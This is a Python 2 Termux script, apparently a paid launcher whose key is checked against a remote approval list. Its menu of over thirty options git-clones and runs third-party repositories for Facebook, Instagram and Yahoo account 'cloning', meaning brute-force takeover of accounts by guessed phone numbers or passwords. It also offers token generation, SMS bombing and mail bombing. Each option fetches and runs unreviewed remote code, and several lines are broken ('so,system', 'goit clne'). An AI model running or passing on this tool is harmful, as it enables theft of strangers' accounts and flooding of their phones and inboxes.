# -*- coding: utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests, base64
logo = '\x1b\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m\n \033[0m================================================================\n\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO\n\033[0;33mGITHUB : \033[1;97mhttps://github.com/MAHDI-Shuvo\nLIVE in Sylhet (Read in class 10)\n\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU\n ================================================================ '
logo1 = """
\033[1;32m55.88b  d88. .d8b. db   db d8888b. d888888b\n88'YbdP`88 d8' `8b 88   88 88  `8D   `88'\n88  88  88 88ooo88 88ooo88 88   88    88\n88  88  88 88~~~88 88~~~88 88   88    88\n88  88  88 88   88 88   88 88  .8D   .88.\nYP  YP  YP YP   YP YP   YP Y8888D' Y888888P                                             
\033[0m================================================================\033[1;37m
CREATED BY MAHDI HASAN(SHUVO)\033[1;34m
FB ; https://web.facebook.com/mahdihasan.80\033[1;33m
FB Grup ;https://web.facebook.com/group/\033[0m\n\033[1;31m👏iam SSC examiner plz  pray  me for get good result👏 \n \033[1;33mIam will give you free aproval but a conditaoin
"""

os.system('clear')

print (48) * '\x1b[1;91m~'
def tik():
    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print ('\r\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Wait A Few Moments \x1b[1;93m') + o,
        sys.stdout.flush()
        time.sleep(0.5)

fuck = []

def jenw():
    os.system('rm -rf .txt')
    os.system('clear')
    print (logo1)
    print (48 )* '\x1b[1;91m~'
    print ("""\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Set Phone Number Amount You Want To Clone\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Example:1000,2000,10000,20000\n""")
    walid = input('\x1b[1;92m     Enter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(walid):
        nmbr = random.randint(1111111, 9999999)
        sys.stdout = open('.txt', 'a')
        print ('nmbr')
        sys.stdout.flush()

import uuid
def bnsbuy():
    os.system('clear')
    print(logo1)
    print ('')
    print ('\x1b[1;92;1m Note: If Approval In Loading Or Show \nNo Internet Connection,Then Connect USA Proxy ')
    print ('')
    time.sleep(1)
    try:
        to = open('/data/data/com.termux/files/usr/etc/termuxopps', 'r').read()
        bns = base64.b64decode(to)
    except (KeyError, IOError):
        bnsreg()
    try:
        l = ('https://raw.githubusercontent.com/MAHDI-Shuvo/maprove/main/mahdi.text')        
        r = requests.get(l).text
    except requests.exceptions.ConnectionError:
        print ("\x1b[0;31mNo Internet Connection")
        exit()

    if bns in r:
        fuck.append(1)
        main1()
    else:
        os.system('clear')
        print (logo1)                                   
        print ( ' \x1b[1;96m\tYour Id Is Not Approved ')
        print
        print ('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Do Not Press Enter If You Are A Free User\x1b[0m')
        print
        print ('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key : \x1b[101m' )+ bns + '\x1b[0m'
        print
        raw_input('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools ')
        os.system('am start https://wa.me/+8801887408882?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDI%20Paid%20Tools.%20My%20Key:%20' + bns)
        bnsbuy()


def bnsreg():
    os.system('clear')
    print (logo1)
    print ('\t\x1b[1;96m Key Not Approved \x1b[0m')
    print
    print ('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Note : This Tools Is Paid,So Pay First')
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~MAHDI=="
    print
    print ('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key: \x1b[92m\x1b[101m') + id + '\x1b[0m'
    print 
    ben = base64.b64encode(id)
    raw_input('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools')
    os.system('am start https://wa.me/+8801887408882?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20' + id)
    sav = open('/data/data/com.termux/files/usr/etc/termuxopps', 'w')
    sav.write(ben)
    sav.close()
    os.system("clear")
    time.sleep(3)
    print (logo1)
    jalan("\x1b[1;92mSent Your Key :\x1b[1;92m \x1b[1;92m" + id + "\x1b[1;92m \n\x1b[1;92mTo Admin And Buy This Tools First \n \x1b[1;92mThen Run This Tools With \x1b[1;93m python2 mahdi.py ")
    exit()
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]')]
br.addheaders = [('User-Agent', 'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]')]

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print
print (logo1)
print (47 )* '\x1b[1;91m-'
def lisensi():
    os.system('clear')
    main1()

def main1():
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print ("\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team")
        exit()
    os.system('clear')
    print (logo)
    print (47) * '\x1b[1;91m-'
    print ('\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Start CRACKING')
    time.sleep(0.05)
    print ('\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Back')
    pilih_login()

def pilih_login():
    if 1 in fuck:
        os.system('#')
    else:
        os.system("clear")
        print ("\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team")
        exit()
    peak = raw_input("\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m")
    if peak in [""]:
        print("\x1b[1;92mFill In Correctly")
        pilih_login()
    elif peak in ["1", "01"]:
        Zeek()
def Zeek():
    os.system('clear')
    print (logo)
    print (47 )* '\x1b[1;92m-' 
    os.system('clear')
    print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
    \033[0m================================================================
    \33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
    \033[0;33mGITHUB : \033[1;97mMAHDI HASAN
    \033[1;31mFb ; https://web.facebook.com/mahdihasanshuvo.nove
    \033[1;37mFb ; https://web.facebook.com/m.mahdi.80
    \033[1;36mWHATAPP:01887408882
    \033[1;33mLIVE in Sylhet (Read in class 10)
    \033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
    \033[0;36m================================================================\n\033[1;31m👏iam SSC examiner plz  pray  me for get good result👏 \n \033[1;33mIam will give you free aproval but a conditaoin""")
    print("""
    \033[1;37m[1]CLONE BANGLADESH ID[fast]
    \033[1;32m[2]CLONE FROM BANGLADESH 6DIG[All SIM]
    \033[1;88m[3]CLONE FROM CLONE FROM ID BANGLADESH 9DIG (All SIM)
    \033[1;33m[4]CLONE FROM ID BANGLADESH 11DIG[All SIM]  
    \033[1;32m[5]CLONE FROM FREOM PAKISTAN
    \033[1;33m[6]CLONE FROM FROM INDIA
    \033[1;36m[7]CLONE FROM Thailand ID
    \033[1;32m[8]CLONE FROM AFGHANISTAN 
    \033[1;33m[9]CLONE FROM FREOM PAKISTAN V2(All SIM)
    \033[1;88m[10]CLONE FROM FREOM 4 COUNTRY 
    \033[1;88m[11]CLONE FROM FREOM all COUNTRY
    \033[0;33m[12]CLONE FROM INSTRAGRAM
    \033[0;88m[13]GAMING ID CLONER 
    \033[1;33m[14]CLONE FROM PUBLICK ID (need TOKEN)
    \033[1;35m[15]CLONE DEATH YAHOO
    \033[1;33m[16]CLONE FROM 2006- 2009 ID[Yahoo]
    \033[1;32m[17]CLONE FROM 2009 ID [MAO]
    \033[1;32m[18]CLONE FROM 2006- 2009 ID 
    \033[1;37m[19]FB AUTO SHARE (need TOKEN)
    \033[1;33m[20]FB AUTO COMMENT(need TOKEN)

                     \033[1;37mFRENDLIST CLONER
    \033[1;33m[21]CLONE FROM  PUBLICK ID  (Best)64 bid                  
    \033[1;36m[22]CLONE FROM  PUBLICK ID  (Best)64 bid
    \033[1;36m[23]CLONE FROM  PUBLICK ID  (best)64 bid
    \033[1;33m[24]CLONE FROM FRIENDLIST (34 bid)V1
    \033[1;36m[25]CLONE FROM FRIENDLIST (34 bid)v2
    \033[1;33m[26]CLONE FROM FRIENDLIST (34 bid)V3 
    \033[1;32m[27]CLONE FROM FRIENDLIST (34/64bid)V3 
    \033[1;33m[28]CLONE FROM FRIENDLIST  V4

                 \033[4;31mOTHET SURVICE 
    \033[1;36m[29]SMS BOMBING BD NUMBER
    \033[1;32m[30]TAMPMAIL [MAO]
    \033[1;33m[31]MAIL BOMBIBG
                  NEW UPADATE
    \033[1;93m[32]CLONE FROM 2004- 2006 ID Best(need aproval)
    \033[1;93m[33]CLONE FROM 2004- 2006 ID Best(FREE)
    \033[1;33m[34]CLONE FROM ID BANGLADESH ALL DIG[All SIM]
    """)
    pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

    if pil in ["01", "1"]:

        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python2 RR_Premium.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)

    elif pil in ["02", "2"]:
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
        os.system('cd paidfree4')
        os.system('python2 BD6.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()
        

    elif pil in ["3"]:
        os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd $HOME')
        so,system('cd shuvook && python2 bd9.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)

    elif pil in ["04", "4"]:

        os.system('git clone https://github.com/HackerYT0/BD-CLONER')
        os.system('cd BD-CLONER')
        os.system('python2 Bd-Cloner-1.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()
    

    elif pil in ["5"]:
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd $HOME')
        os.system('cd paidfree4 && python2 pakistan.py')
        time.sleep(2)
    
    elif pil in ["6"]:
        os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)   
    
    elif pil in ["7"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python2 Thailand.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)


    elif pil in ["8"]:
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
        os.system('cd paidfree4 && python2 Mahadi-Afg.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()
    
    elif pil in ["9"]:
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
        os.system('cd paidfree4')
        os.system('python mahdi2.py')
        time.sleep(2)
 
    elif pil in ["10"]:
        os.system('git clone https://github.com/faizanwahla/pacman.git')
        os.system('cd pacman && python2 bolt')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()
	
	
    elif pil in ["11"]:   
        os.system('git clone http://github.com/nfs-tech-bd/NFS-ALL')
        os.system('cd NFS-ALL && python2 NFS-ALL.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)	
    elif pil in ["12"]:
        os.system('pip2 install requests mechanize')
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
        os.system('cd paidfree4')
        os.system('python2 instragam.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()



    
    elif pil in ["13"]:
        os.system('git clone https://github.com/Hannan-404/pro-1')
        os.system('cd pro-1 && python pro.py')
        time.sleep(2)
        print(" ")
        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
        time.sleep(2)
        Zeek()

    elif pil in ["14"]:
        os.system('goit clne https://github.com/Shuvo-BBHH/texs')
        os.system('cd texs && python2 xm.py')
        time.sleep(2)
    
    elif pil in ["15"]:
        os.system('git clone https://github.com/Shuvo-BBHH/texs')	
        os.system('cd texs && python yahoo.py')

    elif pil in ["16"]:
        os.system('git clone https://github.com/Shuvo-BBHH/texs')
        os.system('cd texs && python2 santo.py')
        time.sleep(2)   

    elif pil in ["17"]:
        os.system('pip2 install mclone')
        os.system('mclone')
    
    elif pil in ["18"]:
        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
        os.system('cd paidfree4 && python 20091st.py')
        time.sleep(2)
    
    elif pil in ["19"]:
        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
        os.system('cd fbboT && python mahdi.py')

    elif pil in ["20"]:
        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
        os.system('cd fbboT && python autocomment.py')
	

    elif pil in ["21"]:
        os.system('git clone https://github.com/Hannan-404/ADF')
        so.system('cd ADF && python ADF.py')
    	

    elif pil in ["22"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python Zahid.py')
        
    
	
    elif pil in ["23"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python fcpromax.py')
    	
    elif pil in ["24"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python2 file.py')
    
    elif pil in ["25"]:
        os.system('git clone https://github.com/HANNAN0098/Token-Gen')
        os.system('cd Token-Gen && python2 Genrate.py')
     


    elif pil in ["26"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python3 okk.py')
        

    elif pil in ["27"]:
        os.system('git clone https://github.com/Shuvo-BBHH/mall')
        os.system('cd mall && python number.py')

    elif pil in ["28"]:
        os.system('rm -rf RamXan')
        os.system('git clone https://github.com/ramzantanha/RamXan')
        os.system('cd RamXan && python RamXan.py')
       
    elif pil in ["29"]:
        os.system('git clone https://github.com/Toxic-Noob/ToxicBomber')
        os.system('cd ToxicBomber && python Tbomb.py')
       

    elif pil in ["30"]:
        os.system('apt update -y ; apt install python -y ; apt install git -y ; pip install requests ; git clone https://github.com/mao2116/mmail')
        os.system('cd mmail && python mmail.py')
     
    elif pil in ["31"]:
        os.system('git clone https://github.com/Toxic-Noob/EmailTools')
        os.system('cd EmailTools')
        os.system('pip install -r requirements.txt')
        os.system('python e-tools.py')
     
    elif pil in ["32"]:
        os.system('git clone https://github.com/MAHDI-Shuvo/1')
        os.system('cd 1')
        os.system('python2 mahdi.py')
     
    elif pil in ["33"]:
        os.system('git clone https://github.com/Shuvo-BBHH/taw')
        os.system('cd taw')
        os.system('python2 mh.py')
     
    elif pil in ["34"]:
        os.system('git clone https://github.com/MAHDI-Shuvo/tansbdall')
        os.system('cd tansbdall')
        os.system('python main.py')
     

   
    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Thanks For Using My Tools")
    print (47) * ("\x1b[1;91m-")
    raw_input("\n\x1b[1;93m Press Enter To Back")
    main1()


bnsbuy()
